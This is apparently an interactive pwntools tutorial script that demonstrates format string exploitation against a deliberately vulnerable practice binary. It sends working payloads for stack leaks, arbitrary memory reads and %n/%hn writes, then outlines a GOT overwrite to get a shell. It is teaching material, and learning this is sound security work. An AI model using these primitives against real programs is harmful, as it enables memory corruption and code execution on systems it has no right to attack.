#!/usr/bin/python
import sys
import time
import argparse
from pwn import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def wait_for_prompt(r):
  print r.recvuntil("Give me something to say!")

def get_addr(r):
  addr = int(r.recvuntil(")")[:-1],16)
  return addr

def wait_any_key():
  raw_input("Press Enter to continue...")

def print_line():
  print '-'*80

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  parser.add_argument('--remote', '-r', action="store_true")
  args = parser.parse_args()

  if args.remote:
    r = remote('remote_server', 10103)
  else:
    r = process('./fsbplayground')

  if args.dbg:
    gdb.attach(r, """
    b *main+334
    c
    """)

  # ------------------------------------------------------------------------
  # Known Addresses
  GOT_EXIT = 0x804a020 

  # ------------------------------------------------------------------------
  """
  str_lower(0x804a03c): abcdefghijklmnopqrstuvwxyz
  str_upper(0x804a058): ABCDEFGHIJKLMNOPQRSTUVWXYZ
  command  (0x804a074): echo you just ran a command
  g_intval (0x804a038): 0xaabbccdd
  """
  r.recvuntil("str_lower(0x")
  addr_str_lower = get_addr(r)
  r.recvuntil("str_upper(0x")
  addr_str_upper = get_addr(r)
  r.recvuntil("command  (0x")
  addr_command = get_addr(r)
  r.recvuntil("g_intval (0x")
  addr_intval = get_addr(r)
  r.recvuntil("g_intval2(0x")
  addr_intval2 = get_addr(r)

  wait_for_prompt(r)
  r.clean()
  
  print bcolors.OKGREEN + "WELCOME to the FSB playground and showcase. We'll be walking through some examples of things that are possible with a FSB"
  wait_any_key()

  print_line()
  print 'First lets look at where things are stored in memory'
  r.sendline(' ')
  wait_for_prompt(r)
  print_line()
  print bcolors.BOLD + 'Notice the address in the brackets, we will be using these to tell printf what to write where.'
  print bcolors.OKBLUE + """
   - First things first, lets try to understand what happens when a function is called in the code
   The arguments to the function are pushed to the stack and then the function is called.
   So doing a printf("%d %d %d", 1, 2, 3); will push 4 values to the stack

   If we look at the assembly it would be:
     push   3
     push   2
     push   1
     push   0x80485f0              <----Pointer to the string "%d %d %d"
     call   printf@plt                    

   This results in the following on the stack

   -----------------------
   - Lower addresses
   | Pointer to string "%d %d %d"
   | 0x00000001
   | 0x00000002
   | 0x00000003
   |
   |
   - Higher addresses

   If you have control of the string that is being passed to printf(), then you have control of what stack variables are printed out.

   For example. If we pass the following string to our vulnerable input: "AAAA %p %p %p %p %p %p %p %p %p %p %p %p"
   We start off with a placeholder that is easily recognizable "AAAA" and then a bunch of prints for pointers. 
   Lets send that now:
  """
  wait_any_key()
  r.clean()

  r.sendline("AAAA %p %p %p %p %p %p %p %p %p %p %p %p")
  wait_for_prompt(r)
  
  print bcolors.OKBLUE + """
    You should be able to see the AAAA and then a number of hex numbers printed out. Each value is a value on the stack. 
    If you look at position 11 you should see a 0x41414141. This is the hex value for AAAA
    This means that we have found the location on the stack where our input string is being stored.

    This becomes important when we need to read or write values.

    So this is where we introduce the concept of 'Format String Direct access'. 
    We can read out that specfic stack location by using the argument '%11$p'. This means the 11th stack item, printed as a pointer.

    So lets feed it the input string "AAAA%11$p" this should result in the output of "AAAA0x41414141"
  """ 
  wait_any_key()
  r.sendline("AAAA%11$p")
  wait_for_prompt(r)




  byte4 = addr_str_upper & 0xff
  byte3 = (addr_str_upper >> 8) & 0xff
  byte2 = (addr_str_upper >> 16) & 0xff
  byte1 = (addr_str_upper >> 24) & 0xff
  print bcolors.OKBLUE + """
    Great. So that should have worked. So what does that all mean? How is that useful??

    So you can print a certain stack value. Big deal right???

    Well we should now be able to use that to give us an arbitrary read primitive. 
    What about the string in memory that contains the uppercase characters.. This could be the location of a super secret passphrase
    Or the address of a library that is loaded at a random location. But would be really useful to know (when we're not supposed to)

    So we know the address of the string. In this case: {} .
    So lets format our input string like this: '/x{}/x{}/x{}/x{} The String is:%11$s' (via a python print statement, in order to send the raw bytes)
    
    This should result in the str_upper string being printed out.
    This works because we're telling printf to use the pointer at the 11th stack location as the string
  """.format(hex(addr_str_upper), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])

  wait_any_key()
  r.sendline(p32(addr_str_upper) + ' The String is:%11$s')
  wait_for_prompt(r)


  

  byte4 = addr_intval & 0xff
  byte3 = (addr_intval >> 8) & 0xff
  byte2 = (addr_intval >> 16) & 0xff
  byte1 = (addr_intval >> 24) & 0xff

  print bcolors.OKBLUE + """
 
    Now we have learned a super useful 'read memory from anywhere' trick. What about writing?

    Well this is where we introduce the %n parameter. This will write the 'Number of bytes written so far' to a pointer on the stack.
    In a regular usage you would expect to see:
      int value = 0;
      printf ("1234567890%n", &value);

    This would write a value of 10 into the address of value.
    So how is this useful?

    This gives us a useful write primitive to write arbitrary memory locations. This is really powerful!

    If we take the address of g_intval {} and set that as our first 4 bytes, and then do a %n, we should see g_intval change to 0x4

    Lets try sending '/x{}/x{}/x{}/x{}%11$n' (via a python print statement, in order to send the raw bytes)

  """.format(hex(addr_intval), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])

  wait_any_key()
  r.sendline(p32(addr_intval) + '%11$n')
  wait_for_prompt(r)





  byte4 = addr_intval2 & 0xff
  byte3 = (addr_intval2 >> 8) & 0xff
  byte2 = (addr_intval2 >> 16) & 0xff
  byte1 = (addr_intval2 >> 24) & 0xff

  print bcolors.OKBLUE + """
    You should now see that the value of g_intval went from 0xaabbccdd to 0x4.
    But this means that we overwrote the whole 32 bits. What about if we want to preserve the first 2bytes of the address?

    Well we can do that with: %hn which will only write 2 bytes.
    
    If we take the address of g_intval2 {} and set that as our 11th stack position and write the number of written bytes with %hn...     
    Lets try sending '/x{}/x{}/x{}/x{}%11$hn'

  """.format(hex(addr_intval2), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
  wait_any_key()
  r.sendline(p32(addr_intval2) + '%11$hn')
  wait_for_prompt(r)
  
  print bcolors.OKBLUE + """
    You should see that the value of g_intval2 is now: 0x11220004.

    But what if we want to write a bigger number? We could do something like '\xaa\xaa\xaa\xaa1234%11$n' and the value of 8 would be written.
    But that is problematic since we only have a buffer of 64bytes. How do we do values of more than 64 bytes in this case?

    Introducing the '%123c' argument... This will print out 123 spaces. %800c will print out 800 spaces. This is a huge help.

    So if we want to restore the original value of g_intval2 the lower 2 bytes need to be 0x3344. This means we can format an input like this:
    '/x{}/x{}/x{}/x{}%13120c%11$n'

    Some explaination is probably needed. We take 0x3344 and convert that to decimal: 13124. 
    We then need to subtract the number of bytes that have already been written, in this case 4, since the address is 4 bytes.

    Lets try that. NOTE: You'd usually see a WHOLE bunch of spaces... 13120 to be exact. For this example I've take those away

  """.format( hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:] )
  wait_any_key()
  r.sendline(p32(addr_intval2) + '%13120c%11$hn')
  r.clean()



  print bcolors.BOLD + "Lets look at the values now"
  print r.sendline(' ')
  wait_for_prompt(r)
  print bcolors.OKBLUE + """
    The value of g_intval2 should now be 0x11223344 again.

    Now we have a very powerful ability to write values to any writable location in memory. WOW. So what can we do with this power?

    We can redirect the execution flow of the application in several ways. One of the favorites is by updating the Global Offset Table.
    That is beyond the scope of this FSB tutorial. 
    
    But feel free to expand on this example to get shell by:
     1 - Updating the exit() pointer in the GOT to point to the hidden() function instead
     2 - Update the command string to say "/bin/sh;" instead
     3 - Give an empty input to break out of the while loop and call exit().
  """

  # Drop to interactive console
  r.interactive()

